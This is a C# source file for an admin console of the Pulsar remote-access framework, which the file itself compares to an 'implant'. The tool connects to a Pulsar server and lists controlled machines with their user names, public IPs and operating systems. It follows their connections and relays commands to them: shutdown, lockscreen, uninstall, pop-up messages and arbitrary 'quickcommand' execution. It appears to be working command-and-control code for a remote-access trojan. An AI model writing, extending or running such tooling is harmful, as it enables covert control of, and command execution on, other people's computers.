using Pulsar.AdminClient;
using Pulsar.Common.Messages.AdminRelay;
using Pulsar.Common.Messages.Other;
using System.Security.Cryptography;
using System.Text;

// Pulsar.AdminClient — lightweight permissioned client (roadmap: "allow different types of clients").
// Connects to a regular Pulsar server, authenticates with the configured admin key and can
// list managed clients, follow connect/disconnect events and relay whitelisted commands to
// them — without running the full server UI.
//
// Usage:
//   Pulsar.AdminClient --host <host:port> --key <adminKey> [--cert <p12|cer> [--certpass <pw>]] [--tag <tag>]
//                      [--list] [--watch [--duration <seconds>]]
//                      [--target <clientId> --action <shutdown|restart|standby|lockscreen|reconnect|disconnect|uninstall|messagebox|quickcommand>
//                       [--text <text>] [--caption <caption>] [--cmdhost <host>]]
//
// Exit codes: 0 success · 1 admin access denied · 2 connection/handshake failure · 3 usage error.
// NOTE: RELEASE builds require --cert (the server's Pulsar.p12) for signing + encryption,
// exactly like an implant built by the server. DEBUG builds run plaintext for local testing.

string host = null;
ushort port = 0;
string certPath = null;
string certPass = null;
string adminKey = null;
string tag = "ADMIN";
bool list = false, watch = false;
double durationSeconds = 0;
string targetId = null;
string action = null;
string text = null, caption = null, cmdHost = null;

for (int i = 0; i < args.Length; i++)
{
    switch (args[i])
    {
        case "--host":
            ParseHost(args[++i], out var parsedHost, out var parsedPort);
            host = parsedHost; port = parsedPort;
            break;
        case "--cert": certPath = args[++i]; break;
        case "--certpass": certPass = args[++i]; break;
        case "--key": adminKey = args[++i]; break;
        case "--tag": tag = args[++i]; break;
        case "--list": list = true; break;
        case "--watch": watch = true; break;
        case "--duration": durationSeconds = double.Parse(args[++i]); break;
        case "--target": targetId = args[++i]; break;
        case "--action": action = args[++i]?.ToLowerInvariant(); break;
        case "--text": text = args[++i]; break;
        case "--caption": caption = args[++i]; break;
        case "--cmdhost": cmdHost = args[++i]; break;
        default:
            Console.Error.WriteLine($"unknown argument: {args[i]}");
            return 3;
    }
}

if (host == null || port == 0 || string.IsNullOrEmpty(adminKey))
{
    Console.Error.WriteLine("usage: Pulsar.AdminClient --host <host:port> --key <adminKey> [--cert <p12>] [--list] [--watch] [--target <id> --action <name> ...]");
    return 3;
}

var cert = certPath != null
    ? new System.Security.Cryptography.X509Certificates.X509Certificate2(certPath, certPass)
    : null;

AdminConnection connection;
try
{
    connection = new AdminConnection(cert);
}
catch (InvalidOperationException ex)
{
    Console.Error.WriteLine(ex.Message);
    return 3;
}

try
{
    connection.Connect(host, port);
}
catch (Exception ex)
{
    Console.Error.WriteLine($"connect failed: {ex.Message}");
    return 2;
}

// regular identification handshake (same as an implant)
ClientIdentification identification;
try
{
    identification = await connection.IdentifyAsync(tag, Environment.UserName, Environment.MachineName,
        $"AdminConsole ({Environment.OSVersion.VersionString})", "AdminClient-1.0", TimeSpan.FromSeconds(10));
}
catch (Exception ex)
{
    Console.Error.WriteLine($"identification failed: {ex.Message}");
    return 2;
}

// admin identification
string keyHash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(adminKey)));
var pendingAdminResult = connection.WaitForAsync<AdminIdentificationResult>(TimeSpan.FromSeconds(10));
connection.Send(new AdminIdentification { AdminKeyHash = keyHash });

var adminResult = await pendingAdminResult;
if (adminResult == null)
{
    Console.Error.WriteLine("admin identification timed out (server may not support admin clients)");
    return 2;
}

if (!adminResult.Accepted)
{
    Console.Error.WriteLine($"ADMIN DENIED: {adminResult.DeniedReason}");
    return 1;
}

Console.WriteLine("ADMIN OK");
PrintClients(adminResult.Clients);
bool didWork = false;

if (list)
{
    didWork = true;
    var pendingListResponse = connection.WaitForAsync<GetAdminClientListResponse>(TimeSpan.FromSeconds(10));
    connection.Send(new GetAdminClientList());
    var response = await pendingListResponse;
    if (response == null)
    {
        Console.Error.WriteLine("client list timed out");
        return 2;
    }
    Console.WriteLine($"LIST {response.Clients?.Length ?? 0}");
    PrintClients(response.Clients);
}

if (targetId != null || action != null)
{
    didWork = true;
    if (string.IsNullOrEmpty(targetId) || string.IsNullOrEmpty(action))
    {
        Console.Error.WriteLine("--target and --action must be used together");
        return 3;
    }

    if (!Enum.TryParse<AdminRelayCommand>(action, ignoreCase: true, out var command) || command == AdminRelayCommand.None)
    {
        Console.Error.WriteLine($"unknown action: {action} (shutdown|restart|standby|lockscreen|reconnect|disconnect|uninstall|messagebox|quickcommand)");
        return 3;
    }

    string param1 = null, param2 = null;
    if (command == AdminRelayCommand.MessageBox)
    {
        param1 = caption ?? "Pulsar";
        param2 = text ?? string.Empty;
        if (string.IsNullOrEmpty(param2))
        {
            Console.Error.WriteLine("messagebox requires --text");
            return 3;
        }
    }
    else if (command == AdminRelayCommand.QuickCommand)
    {
        param1 = text;
        param2 = cmdHost;
        if (string.IsNullOrEmpty(param1))
        {
            Console.Error.WriteLine("quickcommand requires --text <command>");
            return 3;
        }
    }

    var pendingRelayResult = connection.WaitForAsync<AdminRelayResult>(
        TimeSpan.FromSeconds(10),
        result => string.Equals(result.TargetId, targetId, StringComparison.OrdinalIgnoreCase));
    connection.Send(new DoAdminRelay { TargetId = targetId, Command = command, Param1 = param1, Param2 = param2 });
    var relayResult = await pendingRelayResult;
    if (relayResult == null)
    {
        Console.Error.WriteLine("relay result timed out");
        return 2;
    }

    if (relayResult.Accepted)
    {
        Console.WriteLine($"RELAY OK {command}");
    }
    else
    {
        Console.Error.WriteLine($"RELAY FAILED: {relayResult.Reason}");
        return 1;
    }
}

if (watch)
{
    didWork = true;
    Console.WriteLine("WATCH started");
    var watchSource = new CancellationTokenSource();
    if (durationSeconds > 0)
    {
        watchSource.CancelAfter(TimeSpan.FromSeconds(durationSeconds));
    }

    connection.Disconnected += () => watchSource.Cancel();

    try
    {
        while (!watchSource.IsCancellationRequested)
        {
            var evt = await connection.WaitForAsync<AdminClientEvent>(Timeout.InfiniteTimeSpan)
                .WaitAsync(watchSource.Token);
            if (evt == null)
                break; // connection dropped

            string marker = evt.Connected ? "+" : "-";
            Console.WriteLine($"EVENT {marker} {evt.Client?.UserAtPc ?? "-"} {evt.Client?.Id ?? "-"}");
        }
    }
    catch (OperationCanceledException)
    {
    }
}

connection.Dispose();
return 0;

static void PrintClients(AdminClientInfo[] clients)
{
    if (clients == null || clients.Length == 0)
    {
        Console.WriteLine("CLIENTS 0");
        return;
    }

    Console.WriteLine($"CLIENTS {clients.Length}");
    foreach (var client in clients)
    {
        Console.WriteLine($"CLIENT {client.Id} | {client.UserAtPc} | {client.Tag} | {client.PublicIp} | {client.OperatingSystem}");
    }
}

static void ParseHost(string input, out string host, out ushort port)
{
    port = 4782;
    host = input;
    int colon = input.LastIndexOf(':');
    if (colon >= 0)
    {
        host = input.Substring(0, colon);
        port = ushort.Parse(input.Substring(colon + 1));
    }
}
